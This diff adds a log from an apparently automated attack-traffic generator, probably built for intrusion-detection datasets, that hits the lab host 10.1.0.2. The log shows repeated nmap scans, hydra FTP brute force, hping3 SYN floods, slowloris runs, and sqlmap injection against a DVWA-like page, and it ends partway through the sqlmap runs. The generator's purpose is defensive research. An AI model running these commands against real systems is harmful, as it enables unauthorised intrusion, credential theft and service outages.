@@ -1,0 +1,446 @@
+[2026-09-05T11:53:28.271684] === Flushing iptables before recon_attack.py ===
+[2026-09-05T11:53:28.526935] Victim iptables flushed + management SSH rule re-added.
+[2026-09-05T11:53:28.526986] === Starting recon_attack.py with 35 sessions ===
+[recon_gcp_001] Starting: nmap -sS -T4 -p- 10.1.0.2
+[recon_gcp_001] TIMED OUT after 120s
+[recon_gcp_001] Logged. Duration: 120.03s
+[recon_gcp_002] Starting: nmap -sS -T4 -p- 10.1.0.2
+[recon_gcp_002] Logged. Duration: 2.08s
+[recon_gcp_003] Starting: nmap -sS -T2 -p 1-150 10.1.0.2
+[recon_gcp_003] Logged. Duration: 9.47s
+[recon_gcp_004] Starting: nmap -sS -T4 -p- 10.1.0.2
+[recon_gcp_004] Logged. Duration: 2.07s
+[recon_gcp_005] Starting: nmap -sS -T4 -p- 10.1.0.2
+[recon_gcp_005] Logged. Duration: 2.07s
+[recon_gcp_006] Starting: nmap -sS -T2 -p 1-150 10.1.0.2
+[recon_gcp_006] Logged. Duration: 9.47s
+[recon_gcp_007] Starting: nmap -sS -T4 -p- 10.1.0.2
+[recon_gcp_007] Logged. Duration: 2.08s
+[recon_gcp_008] Starting: nmap -sS -T4 -p- 10.1.0.2
+[recon_gcp_008] Logged. Duration: 2.07s
+[recon_gcp_009] Starting: nmap -sS -T2 -p 1-150 10.1.0.2
+[recon_gcp_009] Logged. Duration: 9.47s
+[recon_gcp_010] Starting: nmap -sS -T4 -p- 10.1.0.2
+[recon_gcp_010] Logged. Duration: 2.08s
+[recon_gcp_011] Starting: nmap -sS -T4 -p- 10.1.0.2
+[recon_gcp_011] Logged. Duration: 2.07s
+[recon_gcp_012] Starting: nmap -sS -T2 -p 1-150 10.1.0.2
+[recon_gcp_012] Logged. Duration: 9.47s
+[recon_gcp_013] Starting: nmap -sS -T4 -p- 10.1.0.2
+[recon_gcp_013] Logged. Duration: 2.08s
+[recon_gcp_014] Starting: nmap -sS -T4 -p- 10.1.0.2
+[recon_gcp_014] Logged. Duration: 2.08s
+[recon_gcp_015] Starting: nmap -sS -T2 -p 1-150 10.1.0.2
+[recon_gcp_015] Logged. Duration: 9.47s
+[recon_gcp_016] Starting: nmap -sS -T4 -p- 10.1.0.2
+[recon_gcp_016] Logged. Duration: 2.07s
+[recon_gcp_017] Starting: nmap -sS -T4 -p- 10.1.0.2
+[recon_gcp_017] Logged. Duration: 2.08s
+[recon_gcp_018] Starting: nmap -sS -T2 -p 1-150 10.1.0.2
+[recon_gcp_018] Logged. Duration: 9.48s
+[recon_gcp_019] Starting: nmap -sS -T4 -p- 10.1.0.2
+[recon_gcp_019] Logged. Duration: 2.08s
+[recon_gcp_020] Starting: nmap -sS -T4 -p- 10.1.0.2
+[recon_gcp_020] Logged. Duration: 2.07s
+[recon_gcp_021] Starting: nmap -sS -T2 -p 1-150 10.1.0.2
+[recon_gcp_021] Logged. Duration: 9.47s
+[recon_gcp_022] Starting: nmap -sS -T4 -p- 10.1.0.2
+[recon_gcp_022] Logged. Duration: 2.08s
+[recon_gcp_023] Starting: nmap -sS -T4 -p- 10.1.0.2
+[recon_gcp_023] Logged. Duration: 2.08s
+[recon_gcp_024] Starting: nmap -sS -T2 -p 1-150 10.1.0.2
+[recon_gcp_024] Logged. Duration: 9.47s
+[recon_gcp_025] Starting: nmap -sS -T4 -p- 10.1.0.2
+[recon_gcp_025] Logged. Duration: 2.07s
+[recon_gcp_026] Starting: nmap -sS -T4 -p- 10.1.0.2
+[recon_gcp_026] Logged. Duration: 2.08s
+[recon_gcp_027] Starting: nmap -sS -T2 -p 1-150 10.1.0.2
+[recon_gcp_027] Logged. Duration: 9.48s
+[recon_gcp_028] Starting: nmap -sS -T4 -p- 10.1.0.2
+[recon_gcp_028] Logged. Duration: 2.07s
+[recon_gcp_029] Starting: nmap -sS -T4 -p- 10.1.0.2
+[recon_gcp_029] Logged. Duration: 2.08s
+[recon_gcp_030] Starting: nmap -sS -T2 -p 1-150 10.1.0.2
+[recon_gcp_030] Logged. Duration: 9.47s
+[recon_gcp_031] Starting: nmap -sS -T4 -p- 10.1.0.2
+[recon_gcp_031] Logged. Duration: 2.07s
+[recon_gcp_032] Starting: nmap -sS -T4 -p- 10.1.0.2
+[recon_gcp_032] Logged. Duration: 2.08s
+[recon_gcp_033] Starting: nmap -sS -T2 -p 1-150 10.1.0.2
+[recon_gcp_033] Logged. Duration: 9.47s
+[recon_gcp_034] Starting: nmap -sS -T4 -p- 10.1.0.2
+[recon_gcp_034] Logged. Duration: 2.07s
+[recon_gcp_035] Starting: nmap -sS -T4 -p- 10.1.0.2
+[recon_gcp_035] Logged. Duration: 2.07s
+[2026-09-05T12:35:55.579903] === Finished recon_attack.py. Sleeping 60s before next category ===
+[2026-09-05T12:36:55.580247] === Flushing iptables before bruteforce_attack.py ===
+[2026-09-05T12:36:55.969593] Victim iptables flushed + management SSH rule re-added.
+[2026-09-05T12:36:55.969680] === Starting bruteforce_attack.py with 35 sessions ===
+[bruteforce_gcp_001] Starting: hydra -t 4 -l testuser -P /home/user/wordlist.txt ftp://10.1.0.2
+[bruteforce_gcp_001] Logged. Duration: 42.69s
+[bruteforce_gcp_002] Starting: hydra -t 4 -l testuser -P /home/user/wordlist.txt ftp://10.1.0.2
+[bruteforce_gcp_002] Logged. Duration: 32.37s
+[bruteforce_gcp_003] Starting: hydra -t 1 -W 3 -l testuser -P /home/user/wordlist.txt ftp://10.1.0.2
+[bruteforce_gcp_003] Logged. Duration: 90.08s
+[bruteforce_gcp_004] Starting: hydra -t 4 -l testuser -P /home/user/wordlist.txt ftp://10.1.0.2
+[bruteforce_gcp_004] Logged. Duration: 42.38s
+[bruteforce_gcp_005] Starting: hydra -t 4 -l testuser -P /home/user/wordlist.txt ftp://10.1.0.2
+[bruteforce_gcp_005] Logged. Duration: 32.37s
+[bruteforce_gcp_006] Starting: hydra -t 1 -W 3 -l testuser -P /home/user/wordlist.txt ftp://10.1.0.2
+[bruteforce_gcp_006] Logged. Duration: 90.09s
+[bruteforce_gcp_007] Starting: hydra -t 4 -l testuser -P /home/user/wordlist.txt ftp://10.1.0.2
+[bruteforce_gcp_007] Logged. Duration: 42.39s
+[bruteforce_gcp_008] Starting: hydra -t 4 -l testuser -P /home/user/wordlist.txt ftp://10.1.0.2
+[bruteforce_gcp_008] Logged. Duration: 32.36s
+[bruteforce_gcp_009] Starting: hydra -t 1 -W 3 -l testuser -P /home/user/wordlist.txt ftp://10.1.0.2
+[bruteforce_gcp_009] Logged. Duration: 90.07s
+[bruteforce_gcp_010] Starting: hydra -t 4 -l testuser -P /home/user/wordlist.txt ftp://10.1.0.2
+[bruteforce_gcp_010] Logged. Duration: 42.39s
+[bruteforce_gcp_011] Starting: hydra -t 4 -l testuser -P /home/user/wordlist.txt ftp://10.1.0.2
+[bruteforce_gcp_011] Logged. Duration: 32.37s
+[bruteforce_gcp_012] Starting: hydra -t 1 -W 3 -l testuser -P /home/user/wordlist.txt ftp://10.1.0.2
+[bruteforce_gcp_012] Logged. Duration: 90.09s
+[bruteforce_gcp_013] Starting: hydra -t 4 -l testuser -P /home/user/wordlist.txt ftp://10.1.0.2
+[bruteforce_gcp_013] Logged. Duration: 42.38s
+[bruteforce_gcp_014] Starting: hydra -t 4 -l testuser -P /home/user/wordlist.txt ftp://10.1.0.2
+[bruteforce_gcp_014] Logged. Duration: 32.37s
+[bruteforce_gcp_015] Starting: hydra -t 1 -W 3 -l testuser -P /home/user/wordlist.txt ftp://10.1.0.2
+[bruteforce_gcp_015] Logged. Duration: 90.08s
+[bruteforce_gcp_016] Starting: hydra -t 4 -l testuser -P /home/user/wordlist.txt ftp://10.1.0.2
+[bruteforce_gcp_016] Logged. Duration: 42.39s
+[bruteforce_gcp_017] Starting: hydra -t 4 -l testuser -P /home/user/wordlist.txt ftp://10.1.0.2
+[bruteforce_gcp_017] Logged. Duration: 32.37s
+[bruteforce_gcp_018] Starting: hydra -t 1 -W 3 -l testuser -P /home/user/wordlist.txt ftp://10.1.0.2
+[bruteforce_gcp_018] Logged. Duration: 90.08s
+[bruteforce_gcp_019] Starting: hydra -t 4 -l testuser -P /home/user/wordlist.txt ftp://10.1.0.2
+[bruteforce_gcp_019] Logged. Duration: 42.39s
+[bruteforce_gcp_020] Starting: hydra -t 4 -l testuser -P /home/user/wordlist.txt ftp://10.1.0.2
+[bruteforce_gcp_020] Logged. Duration: 32.37s
+[bruteforce_gcp_021] Starting: hydra -t 1 -W 3 -l testuser -P /home/user/wordlist.txt ftp://10.1.0.2
+[bruteforce_gcp_021] Logged. Duration: 90.08s
+[bruteforce_gcp_022] Starting: hydra -t 4 -l testuser -P /home/user/wordlist.txt ftp://10.1.0.2
+[bruteforce_gcp_022] Logged. Duration: 42.39s
+[bruteforce_gcp_023] Starting: hydra -t 4 -l testuser -P /home/user/wordlist.txt ftp://10.1.0.2
+[bruteforce_gcp_023] Logged. Duration: 32.37s
+[bruteforce_gcp_024] Starting: hydra -t 1 -W 3 -l testuser -P /home/user/wordlist.txt ftp://10.1.0.2
+[bruteforce_gcp_024] Logged. Duration: 90.08s
+[bruteforce_gcp_025] Starting: hydra -t 4 -l testuser -P /home/user/wordlist.txt ftp://10.1.0.2
+[bruteforce_gcp_025] Logged. Duration: 42.39s
+[bruteforce_gcp_026] Starting: hydra -t 4 -l testuser -P /home/user/wordlist.txt ftp://10.1.0.2
+[bruteforce_gcp_026] Logged. Duration: 32.37s
+[bruteforce_gcp_027] Starting: hydra -t 1 -W 3 -l testuser -P /home/user/wordlist.txt ftp://10.1.0.2
+[bruteforce_gcp_027] Logged. Duration: 90.07s
+[bruteforce_gcp_028] Starting: hydra -t 4 -l testuser -P /home/user/wordlist.txt ftp://10.1.0.2
+[bruteforce_gcp_028] Logged. Duration: 42.39s
+[bruteforce_gcp_029] Starting: hydra -t 4 -l testuser -P /home/user/wordlist.txt ftp://10.1.0.2
+[bruteforce_gcp_029] Logged. Duration: 32.36s
+[bruteforce_gcp_030] Starting: hydra -t 1 -W 3 -l testuser -P /home/user/wordlist.txt ftp://10.1.0.2
+[bruteforce_gcp_030] Logged. Duration: 90.08s
+[bruteforce_gcp_031] Starting: hydra -t 4 -l testuser -P /home/user/wordlist.txt ftp://10.1.0.2
+[bruteforce_gcp_031] Logged. Duration: 42.39s
+[bruteforce_gcp_032] Starting: hydra -t 4 -l testuser -P /home/user/wordlist.txt ftp://10.1.0.2
+[bruteforce_gcp_032] Logged. Duration: 32.37s
+[bruteforce_gcp_033] Starting: hydra -t 1 -W 3 -l testuser -P /home/user/wordlist.txt ftp://10.1.0.2
+[bruteforce_gcp_033] Logged. Duration: 90.08s
+[bruteforce_gcp_034] Starting: hydra -t 4 -l testuser -P /home/user/wordlist.txt ftp://10.1.0.2
+[bruteforce_gcp_034] Logged. Duration: 42.38s
+[bruteforce_gcp_035] Starting: hydra -t 4 -l testuser -P /home/user/wordlist.txt ftp://10.1.0.2
+[bruteforce_gcp_035] Logged. Duration: 32.37s
+[2026-09-05T13:46:19.290207] === Finished bruteforce_attack.py. Sleeping 60s before next category ===
+[2026-09-05T13:47:19.290549] === Flushing iptables before dos_volumetric_attack.py ===
+[2026-09-05T13:47:19.629719] Victim iptables flushed + management SSH rule re-added.
+[2026-09-05T13:47:19.629784] === Starting dos_volumetric_attack.py with 35 sessions ===
+[dos_volumetric_gcp_001] Starting: timeout 10 hping3 -S -p 80 -i u500 10.1.0.2
+[dos_volumetric_gcp_001] Logged. Duration: 10.03s
+[dos_volumetric_gcp_002] Starting: timeout 10 hping3 -S -p 80 -i u500 10.1.0.2
+[dos_volumetric_gcp_002] Logged. Duration: 10.03s
+[dos_volumetric_gcp_003] Starting: timeout 10 hping3 -S -p 80 -i u1000 10.1.0.2
+[dos_volumetric_gcp_003] Logged. Duration: 10.03s
+[dos_volumetric_gcp_004] Starting: timeout 10 hping3 -S -p 80 -i u500 10.1.0.2
+[dos_volumetric_gcp_004] Logged. Duration: 10.03s
+[dos_volumetric_gcp_005] Starting: timeout 10 hping3 -S -p 80 -i u500 10.1.0.2
+[dos_volumetric_gcp_005] Logged. Duration: 10.03s
+[dos_volumetric_gcp_006] Starting: timeout 10 hping3 -S -p 80 -i u1000 10.1.0.2
+[dos_volumetric_gcp_006] Logged. Duration: 10.03s
+[dos_volumetric_gcp_007] Starting: timeout 10 hping3 -S -p 80 -i u500 10.1.0.2
+[dos_volumetric_gcp_007] Logged. Duration: 10.03s
+[dos_volumetric_gcp_008] Starting: timeout 10 hping3 -S -p 80 -i u500 10.1.0.2
+[dos_volumetric_gcp_008] Logged. Duration: 10.03s
+[dos_volumetric_gcp_009] Starting: timeout 10 hping3 -S -p 80 -i u1000 10.1.0.2
+[dos_volumetric_gcp_009] Logged. Duration: 10.03s
+[dos_volumetric_gcp_010] Starting: timeout 10 hping3 -S -p 80 -i u500 10.1.0.2
+[dos_volumetric_gcp_010] Logged. Duration: 10.03s
+[dos_volumetric_gcp_011] Starting: timeout 10 hping3 -S -p 80 -i u500 10.1.0.2
+[dos_volumetric_gcp_011] Logged. Duration: 10.03s
+[dos_volumetric_gcp_012] Starting: timeout 10 hping3 -S -p 80 -i u1000 10.1.0.2
+[dos_volumetric_gcp_012] Logged. Duration: 10.03s
+[dos_volumetric_gcp_013] Starting: timeout 10 hping3 -S -p 80 -i u500 10.1.0.2
+[dos_volumetric_gcp_013] Logged. Duration: 10.03s
+[dos_volumetric_gcp_014] Starting: timeout 10 hping3 -S -p 80 -i u500 10.1.0.2
+[dos_volumetric_gcp_014] Logged. Duration: 10.03s
+[dos_volumetric_gcp_015] Starting: timeout 10 hping3 -S -p 80 -i u1000 10.1.0.2
+[dos_volumetric_gcp_015] Logged. Duration: 10.03s
+[dos_volumetric_gcp_016] Starting: timeout 10 hping3 -S -p 80 -i u500 10.1.0.2
+[dos_volumetric_gcp_016] Logged. Duration: 10.03s
+[dos_volumetric_gcp_017] Starting: timeout 10 hping3 -S -p 80 -i u500 10.1.0.2
+[dos_volumetric_gcp_017] Logged. Duration: 10.03s
+[dos_volumetric_gcp_018] Starting: timeout 10 hping3 -S -p 80 -i u1000 10.1.0.2
+[dos_volumetric_gcp_018] Logged. Duration: 10.03s
+[dos_volumetric_gcp_019] Starting: timeout 10 hping3 -S -p 80 -i u500 10.1.0.2
+[dos_volumetric_gcp_019] Logged. Duration: 10.03s
+[dos_volumetric_gcp_020] Starting: timeout 10 hping3 -S -p 80 -i u500 10.1.0.2
+[dos_volumetric_gcp_020] Logged. Duration: 10.03s
+[dos_volumetric_gcp_021] Starting: timeout 10 hping3 -S -p 80 -i u1000 10.1.0.2
+[dos_volumetric_gcp_021] Logged. Duration: 10.03s
+[dos_volumetric_gcp_022] Starting: timeout 10 hping3 -S -p 80 -i u500 10.1.0.2
+[dos_volumetric_gcp_022] Logged. Duration: 10.03s
+[dos_volumetric_gcp_023] Starting: timeout 10 hping3 -S -p 80 -i u500 10.1.0.2
+[dos_volumetric_gcp_023] Logged. Duration: 10.03s
+[dos_volumetric_gcp_024] Starting: timeout 10 hping3 -S -p 80 -i u1000 10.1.0.2
+[dos_volumetric_gcp_024] Logged. Duration: 10.03s
+[dos_volumetric_gcp_025] Starting: timeout 10 hping3 -S -p 80 -i u500 10.1.0.2
+[dos_volumetric_gcp_025] Logged. Duration: 10.03s
+[dos_volumetric_gcp_026] Starting: timeout 10 hping3 -S -p 80 -i u500 10.1.0.2
+[dos_volumetric_gcp_026] Logged. Duration: 10.02s
+[dos_volumetric_gcp_027] Starting: timeout 10 hping3 -S -p 80 -i u1000 10.1.0.2
+[dos_volumetric_gcp_027] Logged. Duration: 10.03s
+[dos_volumetric_gcp_028] Starting: timeout 10 hping3 -S -p 80 -i u500 10.1.0.2
+[dos_volumetric_gcp_028] Logged. Duration: 10.03s
+[dos_volumetric_gcp_029] Starting: timeout 10 hping3 -S -p 80 -i u500 10.1.0.2
+[dos_volumetric_gcp_029] Logged. Duration: 10.03s
+[dos_volumetric_gcp_030] Starting: timeout 10 hping3 -S -p 80 -i u1000 10.1.0.2
+[dos_volumetric_gcp_030] Logged. Duration: 10.03s
+[dos_volumetric_gcp_031] Starting: timeout 10 hping3 -S -p 80 -i u500 10.1.0.2
+[dos_volumetric_gcp_031] Logged. Duration: 10.03s
+[dos_volumetric_gcp_032] Starting: timeout 10 hping3 -S -p 80 -i u500 10.1.0.2
+[dos_volumetric_gcp_032] Logged. Duration: 10.03s
+[dos_volumetric_gcp_033] Starting: timeout 10 hping3 -S -p 80 -i u1000 10.1.0.2
+[dos_volumetric_gcp_033] Logged. Duration: 10.03s
+[dos_volumetric_gcp_034] Starting: timeout 10 hping3 -S -p 80 -i u500 10.1.0.2
+[dos_volumetric_gcp_034] Logged. Duration: 10.03s
+[dos_volumetric_gcp_035] Starting: timeout 10 hping3 -S -p 80 -i u500 10.1.0.2
+[dos_volumetric_gcp_035] Logged. Duration: 10.03s
+[2026-09-05T14:31:05.676993] === Finished dos_volumetric_attack.py. Sleeping 60s before next category ===
+[2026-09-05T14:32:05.677302] === Flushing iptables before dos_slowloris_attack.py ===
+[2026-09-05T14:32:05.958218] Victim iptables flushed + management SSH rule re-added.
+[2026-09-05T14:32:05.958305] === Starting dos_slowloris_attack.py with 35 sessions ===
+[dos_slowloris_gcp_001] Starting: timeout 20 python3 slowloris/slowloris.py 10.1.0.2 -p 80 -s 50
+[dos_slowloris_gcp_001] Logged. Duration: 20.05s
+[dos_slowloris_gcp_002] Starting: timeout 20 python3 slowloris/slowloris.py 10.1.0.2 -p 80 -s 50
+[dos_slowloris_gcp_002] Logged. Duration: 20.05s
+[dos_slowloris_gcp_003] Starting: timeout 20 python3 slowloris/slowloris.py 10.1.0.2 -p 80 -s 25
+[dos_slowloris_gcp_003] Logged. Duration: 20.05s
+[dos_slowloris_gcp_004] Starting: timeout 20 python3 slowloris/slowloris.py 10.1.0.2 -p 80 -s 50
+[dos_slowloris_gcp_004] Logged. Duration: 20.05s
+[dos_slowloris_gcp_005] Starting: timeout 20 python3 slowloris/slowloris.py 10.1.0.2 -p 80 -s 50
+[dos_slowloris_gcp_005] Logged. Duration: 20.05s
+[dos_slowloris_gcp_006] Starting: timeout 20 python3 slowloris/slowloris.py 10.1.0.2 -p 80 -s 25
+[dos_slowloris_gcp_006] Logged. Duration: 20.05s
+[dos_slowloris_gcp_007] Starting: timeout 20 python3 slowloris/slowloris.py 10.1.0.2 -p 80 -s 50
+[dos_slowloris_gcp_007] Logged. Duration: 20.05s
+[dos_slowloris_gcp_008] Starting: timeout 20 python3 slowloris/slowloris.py 10.1.0.2 -p 80 -s 50
+[dos_slowloris_gcp_008] Logged. Duration: 20.05s
+[dos_slowloris_gcp_009] Starting: timeout 20 python3 slowloris/slowloris.py 10.1.0.2 -p 80 -s 25
+[dos_slowloris_gcp_009] Logged. Duration: 20.04s
+[dos_slowloris_gcp_010] Starting: timeout 20 python3 slowloris/slowloris.py 10.1.0.2 -p 80 -s 50
+[dos_slowloris_gcp_010] Logged. Duration: 20.05s
+[dos_slowloris_gcp_011] Starting: timeout 20 python3 slowloris/slowloris.py 10.1.0.2 -p 80 -s 50
+[dos_slowloris_gcp_011] Logged. Duration: 20.04s
+[dos_slowloris_gcp_012] Starting: timeout 20 python3 slowloris/slowloris.py 10.1.0.2 -p 80 -s 25
+[dos_slowloris_gcp_012] Logged. Duration: 20.05s
+[dos_slowloris_gcp_013] Starting: timeout 20 python3 slowloris/slowloris.py 10.1.0.2 -p 80 -s 50
+[dos_slowloris_gcp_013] Logged. Duration: 20.05s
+[dos_slowloris_gcp_014] Starting: timeout 20 python3 slowloris/slowloris.py 10.1.0.2 -p 80 -s 50
+[dos_slowloris_gcp_014] Logged. Duration: 20.05s
+[dos_slowloris_gcp_015] Starting: timeout 20 python3 slowloris/slowloris.py 10.1.0.2 -p 80 -s 25
+[dos_slowloris_gcp_015] Logged. Duration: 20.05s
+[dos_slowloris_gcp_016] Starting: timeout 20 python3 slowloris/slowloris.py 10.1.0.2 -p 80 -s 50
+[dos_slowloris_gcp_016] Logged. Duration: 20.05s
+[dos_slowloris_gcp_017] Starting: timeout 20 python3 slowloris/slowloris.py 10.1.0.2 -p 80 -s 50
+[dos_slowloris_gcp_017] Logged. Duration: 20.05s
+[dos_slowloris_gcp_018] Starting: timeout 20 python3 slowloris/slowloris.py 10.1.0.2 -p 80 -s 25
+[dos_slowloris_gcp_018] Logged. Duration: 20.04s
+[dos_slowloris_gcp_019] Starting: timeout 20 python3 slowloris/slowloris.py 10.1.0.2 -p 80 -s 50
+[dos_slowloris_gcp_019] Logged. Duration: 20.05s
+[dos_slowloris_gcp_020] Starting: timeout 20 python3 slowloris/slowloris.py 10.1.0.2 -p 80 -s 50
+[dos_slowloris_gcp_020] Logged. Duration: 20.05s
+[dos_slowloris_gcp_021] Starting: timeout 20 python3 slowloris/slowloris.py 10.1.0.2 -p 80 -s 25
+[dos_slowloris_gcp_021] Logged. Duration: 20.05s
+[dos_slowloris_gcp_022] Starting: timeout 20 python3 slowloris/slowloris.py 10.1.0.2 -p 80 -s 50
+[dos_slowloris_gcp_022] Logged. Duration: 20.05s
+[dos_slowloris_gcp_023] Starting: timeout 20 python3 slowloris/slowloris.py 10.1.0.2 -p 80 -s 50
+[dos_slowloris_gcp_023] Logged. Duration: 20.04s
+[dos_slowloris_gcp_024] Starting: timeout 20 python3 slowloris/slowloris.py 10.1.0.2 -p 80 -s 25
+[dos_slowloris_gcp_024] Logged. Duration: 20.04s
+[dos_slowloris_gcp_025] Starting: timeout 20 python3 slowloris/slowloris.py 10.1.0.2 -p 80 -s 50
+[dos_slowloris_gcp_025] Logged. Duration: 20.05s
+[dos_slowloris_gcp_026] Starting: timeout 20 python3 slowloris/slowloris.py 10.1.0.2 -p 80 -s 50
+[dos_slowloris_gcp_026] Logged. Duration: 20.05s
+[dos_slowloris_gcp_027] Starting: timeout 20 python3 slowloris/slowloris.py 10.1.0.2 -p 80 -s 25
+[dos_slowloris_gcp_027] Logged. Duration: 20.05s
+[dos_slowloris_gcp_028] Starting: timeout 20 python3 slowloris/slowloris.py 10.1.0.2 -p 80 -s 50
+[dos_slowloris_gcp_028] Logged. Duration: 20.05s
+[dos_slowloris_gcp_029] Starting: timeout 20 python3 slowloris/slowloris.py 10.1.0.2 -p 80 -s 50
+[dos_slowloris_gcp_029] Logged. Duration: 20.05s
+[dos_slowloris_gcp_030] Starting: timeout 20 python3 slowloris/slowloris.py 10.1.0.2 -p 80 -s 25
+[dos_slowloris_gcp_030] Logged. Duration: 20.04s
+[dos_slowloris_gcp_031] Starting: timeout 20 python3 slowloris/slowloris.py 10.1.0.2 -p 80 -s 50
+[dos_slowloris_gcp_031] Logged. Duration: 20.04s
+[dos_slowloris_gcp_032] Starting: timeout 20 python3 slowloris/slowloris.py 10.1.0.2 -p 80 -s 50
+[dos_slowloris_gcp_032] Logged. Duration: 20.04s
+[dos_slowloris_gcp_033] Starting: timeout 20 python3 slowloris/slowloris.py 10.1.0.2 -p 80 -s 25
+[dos_slowloris_gcp_033] Logged. Duration: 20.04s
+[dos_slowloris_gcp_034] Starting: timeout 20 python3 slowloris/slowloris.py 10.1.0.2 -p 80 -s 50
+[dos_slowloris_gcp_034] Logged. Duration: 20.05s
+[dos_slowloris_gcp_035] Starting: timeout 20 python3 slowloris/slowloris.py 10.1.0.2 -p 80 -s 50
+[dos_slowloris_gcp_035] Logged. Duration: 20.05s
+[2026-09-05T15:10:02.674132] === Finished dos_slowloris_attack.py. Sleeping 60s before next category ===
+[2026-09-05T15:11:02.674472] === Flushing iptables before web_attack.py ===
+[2026-09-05T15:11:03.025892] Victim iptables flushed + management SSH rule re-added.
+[2026-09-05T15:11:03.025989] === Starting web_attack.py with 35 sessions ===
+[webattack_gcp_001] Starting: sqlmap -u "http://10.1.0.2/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --dbs
+[webattack_gcp_001] Logged. Duration: 11.96s
+[webattack_gcp_002] Starting: sqlmap -u "http://10.1.0.2/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --dbs
+[webattack_gcp_002] Logged. Duration: 11.42s
+[webattack_gcp_003] Starting: sqlmap -u "http://10.1.0.2/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --level=1 --risk=1
+[webattack_gcp_003] Logged. Duration: 11.45s
+[webattack_gcp_004] Starting: sqlmap -u "http://10.1.0.2/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --dbs
+[webattack_gcp_004] Logged. Duration: 11.47s
+[webattack_gcp_005] Starting: sqlmap -u "http://10.1.0.2/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --dbs
+[webattack_gcp_005] Logged. Duration: 11.43s
+[webattack_gcp_006] Starting: sqlmap -u "http://10.1.0.2/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --level=1 --risk=1
+[webattack_gcp_006] Logged. Duration: 11.43s
+[webattack_gcp_007] Starting: sqlmap -u "http://10.1.0.2/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --dbs
+[webattack_gcp_007] Logged. Duration: 11.42s
+[webattack_gcp_008] Starting: sqlmap -u "http://10.1.0.2/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --dbs
+[webattack_gcp_008] Logged. Duration: 11.42s
+[webattack_gcp_009] Starting: sqlmap -u "http://10.1.0.2/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --level=1 --risk=1
+[webattack_gcp_009] Logged. Duration: 11.43s
+[webattack_gcp_010] Starting: sqlmap -u "http://10.1.0.2/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --dbs
+[webattack_gcp_010] Logged. Duration: 11.41s
+[webattack_gcp_011] Starting: sqlmap -u "http://10.1.0.2/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --dbs
+[webattack_gcp_011] Logged. Duration: 11.43s
+[webattack_gcp_012] Starting: sqlmap -u "http://10.1.0.2/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --level=1 --risk=1
+[webattack_gcp_012] Logged. Duration: 11.47s
+[webattack_gcp_013] Starting: sqlmap -u "http://10.1.0.2/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --dbs
+[webattack_gcp_013] Logged. Duration: 11.42s
+[webattack_gcp_014] Starting: sqlmap -u "http://10.1.0.2/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --dbs
+[webattack_gcp_014] Logged. Duration: 11.45s
+[webattack_gcp_015] Starting: sqlmap -u "http://10.1.0.2/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --level=1 --risk=1
+[webattack_gcp_015] Logged. Duration: 11.42s
+[webattack_gcp_016] Starting: sqlmap -u "http://10.1.0.2/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --dbs
+[webattack_gcp_016] Logged. Duration: 11.43s
+[webattack_gcp_017] Starting: sqlmap -u "http://10.1.0.2/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --dbs
+[webattack_gcp_017] Logged. Duration: 11.43s
+[webattack_gcp_018] Starting: sqlmap -u "http://10.1.0.2/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --level=1 --risk=1
+[webattack_gcp_018] Logged. Duration: 11.46s
+[webattack_gcp_019] Starting: sqlmap -u "http://10.1.0.2/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --dbs
+[webattack_gcp_019] Logged. Duration: 11.43s
+[webattack_gcp_020] Starting: sqlmap -u "http://10.1.0.2/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --dbs
+[webattack_gcp_020] Logged. Duration: 11.43s
+[webattack_gcp_021] Starting: sqlmap -u "http://10.1.0.2/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --level=1 --risk=1
+[webattack_gcp_021] Logged. Duration: 11.41s
+[webattack_gcp_022] Starting: sqlmap -u "http://10.1.0.2/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --dbs
+[webattack_gcp_022] Logged. Duration: 11.42s
+[webattack_gcp_023] Starting: sqlmap -u "http://10.1.0.2/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --dbs
+[webattack_gcp_023] Logged. Duration: 11.42s
